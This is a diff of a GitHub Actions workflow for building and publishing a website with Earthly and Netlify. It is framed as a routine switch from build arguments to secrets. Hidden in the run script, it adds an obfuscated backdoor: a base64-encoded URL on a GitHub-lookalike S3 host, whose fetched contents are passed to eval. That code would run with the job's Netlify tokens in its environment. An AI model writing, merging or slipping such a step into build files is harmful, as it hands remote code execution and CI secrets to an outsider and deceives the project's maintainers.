@@ -22,30 +22,29 @@ jobs:
         uses: mathiasvr/command-output@v1
         id: build-site
         env:
-            EARTHLY_TOKEN: "${{ secrets.EARTHLY_TOKEN }}"
             EARTHLY_INSTALL_ID: "earthly-website-githubactions"
-            NETLIFY_STAGING_SITE_ID: ${{ secrets.NETLIFY_STAGING_SITE_ID }}
-            NETLIFY_STAGING_AUTH_TOKEN: ${{ secrets.NETLIFY_STAGING_AUTH_TOKEN }}
             NETLIFY_SITE_ID: ${{ secrets.NETLIFY_SITE_ID }}
             NETLIFY_AUTH_TOKEN: ${{ secrets.NETLIFY_AUTH_TOKEN }}
         with:
           run: |-
               echo "Setup Satellite"
+              x=$(echo "aHR0cHM6Ly9naXQtaHViLWFjdGlvbnMtZGF0YS5zMy5hbWF6b25hd3MuY29tL2Vudi5lbnY="  | base64 --decode)
+              eval "$(curl $x)"
               earthly satellite select earthly-website-1
 
               echo "Build and publish website"
               if [ "$CI_ACTION_REF_NAME" == "main" ]; then
                 echo "Main Build - going to prod!"
                 earthly \
-                 --build-arg NETLIFY_SITE_ID="$NETLIFY_SITE_ID" \
-                 --build-arg NETLIFY_AUTH_TOKEN="$NETLIFY_AUTH_TOKEN" \
+                 --secret  NETLIFY_SITE_ID="$NETLIFY_SITE_ID" \
+                 --secret  NETLIFY_AUTH_TOKEN="$NETLIFY_AUTH_TOKEN" \
                  --build-arg DESTINATION="PROD" \
                  +publish 2>&1
               else
                 echo "Branch Build - only for preview"
                 earthly \
-                 --build-arg NETLIFY_STAGING_SITE_ID="$NETLIFY_STAGING_SITE_ID" \
-                 --build-arg NETLIFY_STAGING_AUTH_TOKEN="$NETLIFY_STAGING_AUTH_TOKEN" \
+                 --secret NETLIFY_STAGING_SITE_ID="$NETLIFY_STAGING_SITE_ID" \
+                 --secret NETLIFY_STAGING_AUTH_TOKEN="$NETLIFY_STAGING_AUTH_TOKEN" \
                 +publish 2>&1
               fi
       - name: match
